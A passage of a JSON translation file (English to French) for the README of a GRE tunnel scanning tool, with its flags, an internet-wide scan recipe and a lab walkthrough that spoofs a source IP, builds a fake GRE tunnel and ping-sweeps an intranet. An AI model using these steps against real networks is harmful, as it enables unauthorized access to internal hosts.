+        "originContent": "- `-T <int>`: How many thread send GRE packet in same time (Default: 255)",
+        "translatedContent": "- `-T <int>` : Combien de threads envoient des paquets GRE en même temps (Par défaut : 255)  "
+      },
+      {
+        "row": 22,
+        "rowsha": "+cP2NDY0lUHg/ACqT9hIzVMP2WTMbleP8x8b/z4U+jE=",
+        "originContent": "- `-cs <int>`: Send how many ip until start wait for ping to responsed (default: 1000)",
+        "translatedContent": "- `-cs <int>` : Envoyer combien d’IPs avant de commencer à attendre la réponse ping (par défaut : 1000)  "
+      },
+      {
+        "row": 23,
+        "rowsha": "otRZLxOA6ZDafZpP9WDNTV/5Y+xgzs2gJnHYR/Iy0T8=",
+        "originContent": "- `-dp`: Do private - scan private ip GRE (Default: False)",
+        "translatedContent": "- `-dp` : Faire privé - scanner les IP privées GRE (Par défaut : Faux)  "
+      },
+      {
+        "row": 24,
+        "rowsha": "ZY3kzwofeQZ7RefbFqribwk4epU91s/yA8ql0YxNyx0=",
+        "originContent": "- `-id <ip>`: Inside ICMP dst address (Default: same as GRE dst) ",
+        "translatedContent": "- `-id <ip>` : Adresse destination dans ICMP (Par défaut : même que la destination GRE)  "
+      },
+      {
+        "row": 25,
+        "rowsha": "oGM32Iq7DfTbXASAFH9VhgJ2+w/6G40x4M7diY16hH8=",
+        "originContent": "  - Use this if you know the inside intranet address",
+        "translatedContent": "  - Utilisez ceci si vous connaissez l’adresse intranet interne  "
+      },
+      {
+        "row": 26,
+        "rowsha": "fPsGvGL67C3VQcYS5vH0XwQBOAw93oTuu21FyZ14sxs=",
+        "originContent": "- `-v <log_level>`: Logging level `['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL']` (Default: INFO)",
+        "translatedContent": "- `-v <niveau_log>` : Niveau de log `['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL']` (Par défaut : INFO)  "
+      },
+      {
+        "row": 27,
+        "rowsha": "VwT3rTmWyNU4cdsG8OOUHNYhVPWTTMZIUIxdztFXjh8=",
+        "originContent": "  - GRE peer found log is on `CRITICAL`",
+        "translatedContent": "  - Le log de détection de pair GRE est sur `CRITICAL`  "
+      },
+      {
+        "row": 28,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 29,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 30,
+        "rowsha": "ymKGLIpX4cVgQk5kWFF0BsGVquU9W21HA4kRXF9BQb4=",
+        "originContent": "## better way to scan full public ip",
+        "translatedContent": "## meilleure façon de scanner l’IP publique complète"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 8,
+    "Content": "```\nwget https://bgp.tools/table.txt\ncat table.txt |grep -v \"::\"|cut -d \" \" -f 1 > v4table.txt\npip3 install aggregate6\naggregate6 v4table.txt > aggrv4table.txt\n#cat aggrv4table.txt|wc -l   #159652\npython3 main.py -i  <interface> -lh <your_public_IP> -s aggrv4table.txt -d <your_target> -ss\n```",
+    "ContentSha": "p8RcnOxaSJD3V4R2X0WERDYKhRVOYQ2O6PJ9XYFlxeo=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\nwget https://bgp.tools/table.txt\ncat table.txt |grep -v \"::\"|cut -d \" \" -f 1 > v4table.txt\npip3 install aggregate6\naggregate6 v4table.txt > aggrv4table.txt\n#cat aggrv4table.txt|wc -l   #159652\npython3 main.py -i  <interface> -lh <your_public_IP> -s aggrv4table.txt -d <your_target> -ss\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "N2uW4muL/NEKbiWrOORh5/bQKktrbKFlkEYWkKwIOKY=",
+        "originContent": "wget https://bgp.tools/table.txt",
+        "translatedContent": "wget https://bgp.tools/table.txt"
+      },
+      {
+        "row": 3,
+        "rowsha": "fd7bGbZpl2gFsM3mjrXJcwWxX2xQT9ueQ5/zWHFPjio=",
+        "originContent": "cat table.txt |grep -v \"::\"|cut -d \" \" -f 1 > v4table.txt",
+        "translatedContent": "cat table.txt |grep -v \"::\"|cut -d \" \" -f 1 > v4table.txt"
+      },
+      {
+        "row": 4,
+        "rowsha": "2ejc2BiUTpaF3EbiMfNivHRUjFFwL9ht/6t+YBSMKTM=",
+        "originContent": "pip3 install aggregate6",
+        "translatedContent": "pip3 install aggregate6"
+      },
+      {
+        "row": 5,
+        "rowsha": "JEtWuLaMPWNTXkhEDlz0d9KdOoNB8mnNoALrLQwWPUw=",
+        "originContent": "aggregate6 v4table.txt > aggrv4table.txt",
+        "translatedContent": "aggregate6 v4table.txt > aggrv4table.txt"
+      },
+      {
+        "row": 6,
+        "rowsha": "DRi2uZlZSsyEU64+/U4UevzBM/BENn8/LW0yus6zlJM=",
+        "originContent": "#cat aggrv4table.txt|wc -l   #159652",
+        "translatedContent": "#cat aggrv4table.txt|wc -l   #159652"
+      },
+      {
+        "row": 7,
+        "rowsha": "2OLvef/OKWf+CFXUg2z7E3i2y0JGeN5XQNGOBI18N4E=",
+        "originContent": "python3 main.py -i  <interface> -lh <your_public_IP> -s aggrv4table.txt -d <your_target> -ss",
+        "translatedContent": "python3 main.py -i  <interface> -lh <your_public_IP> -s aggrv4table.txt -d <your_target> -ss"
+      },
+      {
+        "row": 8,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 9,
+    "Content": "\n## Lab\n### Demo video\n- [Youtube](https://youtu.be/DDvfYl5-J28)\n### Scan GRE tunnel\n`python3 main.py -i <iface> -lh <your_ip> -s 1.1.1.1 -d 160.25.104.199`\n### Access & Scan intranet",
+    "ContentSha": "vAvB/LqjMe/N6yPWjZs8f+Tj1NVkqZfoYDUwEJwDmnE=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "\n## Laboratoire\n### Vidéo de démonstration\n- [Youtube](https://youtu.be/DDvfYl5-J28)\n### Scanner un tunnel GRE\n`python3 main.py -i <iface> -lh <votre_ip> -s 1.1.1.1 -d 160.25.104.199`\n### Accéder et scanner l'intranet",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 2,
+        "rowsha": "12Y8LlLNc6FR3blMXP6+MuZL2AADMt6LxvUScf7tmls=",
+        "originContent": "## Lab",
+        "translatedContent": "## Laboratoire"
+      },
+      {
+        "row": 3,
+        "rowsha": "wcai2G50E7DIosztxco+u16WBs026Rof1nAqgYmpEZc=",
+        "originContent": "### Demo video",
+        "translatedContent": "### Vidéo de démonstration"
+      },
+      {
+        "row": 4,
+        "rowsha": "81n4JX86WXvxErm09uPmZ6KoyvMDxTYJeIrZuDsWSUA=",
+        "originContent": "- [Youtube](https://youtu.be/DDvfYl5-J28)",
+        "translatedContent": "- [Youtube](https://youtu.be/DDvfYl5-J28)"
+      },
+      {
+        "row": 5,
+        "rowsha": "TS7yPHk3lEbzQMEyhayc8zFNjhOIPznfRzFxWT5GklI=",
+        "originContent": "### Scan GRE tunnel",
+        "translatedContent": "### Scanner un tunnel GRE"
+      },
+      {
+        "row": 6,
+        "rowsha": "DEzcB7ssWlbcbLnA982cpaw72hYRLQNvIK5pR22iUx4=",
+        "originContent": "`python3 main.py -i <iface> -lh <your_ip> -s 1.1.1.1 -d 160.25.104.199`",
+        "translatedContent": "`python3 main.py -i <iface> -lh <votre_ip> -s 1.1.1.1 -d 160.25.104.199`"
+      },
+      {
+        "row": 7,
+        "rowsha": "uKlViw7eFfNiGLHXjgELVc0pRiy8/0PR9gI0kFkEIU0=",
+        "originContent": "### Access & Scan intranet",
+        "translatedContent": "### Accéder et scanner l'intranet"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 10,
+    "Content": "```\n#### Create Fake Tunnel ####\nIFACE=eth0  #change this \nMYPUBIP=9.9.9.9  #change this\nGATEWAY=1.2.3.4 #change this\nSRCADDR=1.1.1.1 # lab info don't change\nDSTADDR=160.25.104.199 # lab info don't change\nip addr add $SRCADDR/32 dev $IFACE\nip r add $DSTADDR dev $IFACE via $GATEWAY src $SRCADDR\nip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255\nip link set gre1 up mtu 1280\n### start scan intranet ###\nfping -g 192.168.0.0/16\n\n##### scan output #####\n# 192.168.1.2 is alive\n\n## test curl to web ##\ncurl 192.168.1.2\n# YOU KNOW GRE!\n\n#### cleanup ####\nip addr del $SRCADDR/32 dev $IFACE\nip tunnel del gre1\n```",
+    "ContentSha": "dp8NCjhyoKcLqgNAW5UjYZpGf1mQGpILwgYUjOI2S1w=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\n#### Create Fake Tunnel ####\nIFACE=eth0  #change this \nMYPUBIP=9.9.9.9  #change this\nGATEWAY=1.2.3.4 #change this\nSRCADDR=1.1.1.1 # lab info don't change\nDSTADDR=160.25.104.199 # lab info don't change\nip addr add $SRCADDR/32 dev $IFACE\nip r add $DSTADDR dev $IFACE via $GATEWAY src $SRCADDR\nip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255\nip link set gre1 up mtu 1280\n### start scan intranet ###\nfping -g 192.168.0.0/16\n\n##### scan output #####\n# 192.168.1.2 is alive\n\n## test curl to web ##\ncurl 192.168.1.2\n# YOU KNOW GRE!\n\n#### cleanup ####\nip addr del $SRCADDR/32 dev $IFACE\nip tunnel del gre1\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "3CWAFUc9eJ0pMtKZDV1Rg/oX0/Kgc7A2cuhF4jwi9rk=",
+        "originContent": "#### Create Fake Tunnel ####",
+        "translatedContent": "#### Create Fake Tunnel ####"
+      },
+      {
+        "row": 3,
+        "rowsha": "s6DtWiPJOIr16IPIwh1M6ELYWhGkZBSD/YAdASV+O8M=",
+        "originContent": "IFACE=eth0  #change this ",
+        "translatedContent": "IFACE=eth0  #change this "
+      },
+      {
+        "row": 4,
+        "rowsha": "8reD1g0L6aYeNPw9N74uhEqN44yNkBm/CDK5hq2zECw=",
+        "originContent": "MYPUBIP=9.9.9.9  #change this",
+        "translatedContent": "MYPUBIP=9.9.9.9  #change this"
+      },
+      {
+        "row": 5,
+        "rowsha": "Qf79YQeSudzvtjsoKK7VDRvm2F80stqQAafGHSZd4Hs=",
+        "originContent": "GATEWAY=1.2.3.4 #change this",
+        "translatedContent": "GATEWAY=1.2.3.4 #change this"
+      },
+      {
+        "row": 6,
+        "rowsha": "NWvdiz5Yz3Ce7NTfgECUIWUddYpwwteZ9Y5VfWQMpIc=",
+        "originContent": "SRCADDR=1.1.1.1 # lab info don't change",
+        "translatedContent": "SRCADDR=1.1.1.1 # lab info don't change"
+      },
+      {
+        "row": 7,
+        "rowsha": "kCUsst9kKFKdL64ytV2/giFlR2gFWMq9CySRlN5chxg=",
+        "originContent": "DSTADDR=160.25.104.199 # lab info don't change",
+        "translatedContent": "DSTADDR=160.25.104.199 # lab info don't change"
+      },
+      {
+        "row": 8,
+        "rowsha": "CdwRouPBzDe8InohQmO/x2RRPiPIlKXGhdSg2cepApQ=",
+        "originContent": "ip addr add $SRCADDR/32 dev $IFACE",
+        "translatedContent": "ip addr add $SRCADDR/32 dev $IFACE"
+      },
+      {
+        "row": 9,
+        "rowsha": "1lFjrr+nNG1Jq7vBizPBgMb9DZ+FX60Ekl6Gs2lyo8Q=",
+        "originContent": "ip r add $DSTADDR dev $IFACE via $GATEWAY src $SRCADDR",
+        "translatedContent": "ip r add $DSTADDR dev $IFACE via $GATEWAY src $SRCADDR"
+      },
+      {
+        "row": 10,
+        "rowsha": "k6SIzeaBMN6s2FatYKgmgFmfvykw2Zik3NCbCg3/ELE=",
+        "originContent": "ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255",
+        "translatedContent": "ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255"
+      },
+      {
+        "row": 11,
+        "rowsha": "UfWay+J8RDzJuHVEwHLJ57Zld/cPF72qlICahmi9NEA=",
+        "originContent": "ip link set gre1 up mtu 1280",
+        "translatedContent": "ip link set gre1 up mtu 1280"
+      },
+      {
+        "row": 12,
+        "rowsha": "Ene943xjXFggnkdEgavzwiX29FfBCR0hOr/EabhIyuA=",
+        "originContent": "### start scan intranet ###",
+        "translatedContent": "### start scan intranet ###"
+      },
+      {
+        "row": 13,
+        "rowsha": "0KjQCCTF+DI+RfrHHDXK4ZnnjQ+4k+v+gI/lzqzClhg=",
+        "originContent": "fping -g 192.168.0.0/16",
+        "translatedContent": "fping -g 192.168.0.0/16"
+      },
+      {
+        "row": 14,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 15,
+        "rowsha": "SaUoBVx1tpZxqFUQA+jS04pBEF9+0gnNJhr8k97Mynw=",
+        "originContent": "##### scan output #####",
+        "translatedContent": "##### scan output #####"
+      },
+      {
+        "row": 16,
+        "rowsha": "JY2t4d/tUYxh1G2i5pkaAxuXbeBBkfFWJ4gk80dcQ9Q=",
+        "originContent": "# 192.168.1.2 is alive",
+        "translatedContent": "# 192.168.1.2 is alive"
+      },
+      {
+        "row": 17,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 18,
+        "rowsha": "8INm+955kKDFVhh/2kFyOnc8Rmw0Bk4Th8R72+AZBTc=",
+        "originContent": "## test curl to web ##",
+        "translatedContent": "## test curl to web ##"
+      },
+      {
+        "row": 19,
+        "rowsha": "5olllP9QMnrXIP8flz5kVy7RnDllynIwTKD9H/WPnF8=",
+        "originContent": "curl 192.168.1.2",
+        "translatedContent": "curl 192.168.1.2"
+      },
+      {
+        "row": 20,
+        "rowsha": "xzuLgv/09YyKhl49IrwZwQ/0sZXQdZ/JeHs72Z/I2I4=",
+        "originContent": "# YOU KNOW GRE!",
+        "translatedContent": "# YOU KNOW GRE!"
+      },
+      {
+        "row": 21,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 22,
+        "rowsha": "JZ6P+FRP9ogqQYULHaWl2MHz4amHYQHt2HwpO3OGrSg=",
+        "originContent": "#### cleanup ####",
+        "translatedContent": "#### cleanup ####"
+      },
+      {
+        "row": 23,
+        "rowsha": "ZsAUVOX1se6jBJHtoVICG9GSZ1lmvCazyqpuJHYnqlw=",
+        "originContent": "ip addr del $SRCADDR/32 dev $IFACE",
+        "translatedContent": "ip addr del $SRCADDR/32 dev $IFACE"
+      },
+      {
+        "row": 24,
+        "rowsha": "l5HfW8eyN0jJmwr/JEQ6bE1vJ6L2SuZjMlauOzfGBpw=",
+        "originContent": "ip tunnel del gre1",
+        "translatedContent": "ip tunnel del gre1"
+      },
+      {
+        "row": 25,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 11,
+    "Content": "\n\n## Disclaimer\nThis project is intended for educational and research purposes only. Any actions and/or activities related to this code are solely your responsibility. The authors and contributors are not responsible for any misuse or damage caused by this project. Please ensure that you have proper authorization before testing, using, or deploying any part of this code in any environment. Unauthorized use of this code may violate local, state, and federal laws.\n\n## License\nThis project is licensed under the terms of the MIT license.\n",
+    "ContentSha": "6UUWxNzj64X3ENLVipiqlYJnqUF0meX1f77kGigXutw=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "## Avertissement  \nCe projet est destiné uniquement à des fins éducatives et de recherche. Toute action et/ou activité liée à ce code est de votre seule responsabilité. Les auteurs et contributeurs ne sont pas responsables de toute mauvaise utilisation ou dommage causé par ce projet. Veuillez vous assurer que vous disposez des autorisations appropriées avant de tester, utiliser ou déployer une partie de ce code dans n'importe quel environnement. L'utilisation non autorisée de ce code peut enfreindre les lois locales, étatiques et fédérales.  \n\n## Licence  \nCe projet est sous licence MIT.\n\n\n",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "## Avertissement  "
+      },
+      {
+        "row": 2,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "Ce projet est destiné uniquement à des fins éducatives et de recherche. Toute action et/ou activité liée à ce code est de votre seule responsabilité. Les auteurs et contributeurs ne sont pas responsables de toute mauvaise utilisation ou dommage causé par ce projet. Veuillez vous assurer que vous disposez des autorisations appropriées avant de tester, utiliser ou déployer une partie de ce code dans n'importe quel environnement. L'utilisation non autorisée de ce code peut enfreindre les lois locales, étatiques et fédérales.  "
+      },
+      {
+        "row": 3,
+        "rowsha": "aU2AoMUV45em9//+jYmdfv83JGc0QNF5oAwpldQ5sVo=",
+        "originContent": "## Disclaimer",
+        "translatedContent": ""
+      },
+      {
+        "row": 4,
+        "rowsha": "yjgvEk085LSR9BXDEKqHXRV9FtSBtC6RDVa7mvESyVg=",
+        "originContent": "This project is intended for educational and research purposes only. Any actions and/or activities related to this code are solely your responsibility. The authors and contributors are not responsible for any misuse or damage caused by this project. Please ensure that you have proper authorization before testing, using, or deploying any part of this code in any environment. Unauthorized use of this code may violate local, state, and federal laws.",
+        "translatedContent": "## Licence  "
+      },
+      {
+        "row": 5,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "Ce projet est sous licence MIT."
+      },
+      {
+        "row": 6,
+        "rowsha": "bFSaVtsB4CHySNjaeCiaMZfT24b+DTbTM4HQ38cR6Lw=",
+        "originContent": "## License",
+        "translatedContent": ""
+      },
+      {
+        "row": 7,
+        "rowsha": "sJY57S3/A982omsgx+RE/ay3/GkIXylFQL3tY+HLY/g=",
+        "originContent": "This project is licensed under the terms of the MIT license.",
+        "translatedContent": ""
+      },
+      {
+        "row": 8,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      }
+    ],
+    "IsCodeBlock": false
+  }
+]
